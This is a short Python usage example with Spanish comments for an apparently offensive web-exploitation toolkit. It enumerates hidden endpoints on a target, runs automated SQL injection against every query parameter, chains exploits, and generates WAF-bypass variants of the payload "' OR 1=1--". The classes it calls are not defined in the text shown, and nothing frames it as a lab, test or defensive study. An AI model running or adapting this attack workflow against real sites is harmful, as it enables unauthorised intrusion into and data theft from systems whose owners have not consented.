# Ejemplo de uso programático
async def advanced_exploitation():
    config = {
        'target': 'https://target.com',
        'proxies': ['http://proxy:8080'],
        'threads': 50,
        'timeout': 60,
    }
    
    core = WebExploitationCore(config)
    
    # 1. Enumeración completa
    enumerator = HiddenEndpointEnumerator(config['target'])
    endpoints = await enumerator.enumerate()
    
    # 2. Ataque SQLi avanzado
    for endpoint in endpoints:
        if '?' in endpoint['url']:
            parsed = urllib.parse.urlparse(endpoint['url'])
            params = urllib.parse.parse_qs(parsed.query)
            for param in params:
                results = await core.exploit_sqli(endpoint['url'], param, params[param][0])
                # Procesar resultados...
    
    # 3. Cadena de explotación automática
    chain_results = await core.chain_exploits(config['target'])
    
    # 4. Bypass de WAF
    bypasser = WAFBypasser()
    payloads = bypasser.bypass_sql_injection("' OR 1=1--")
    
    # 5. Utilidades avanzadas
    utils = AdvancedUtils()
    encrypted = utils.encrypt_aes("sensitive_data", "secret_key")
    
    return chain_results
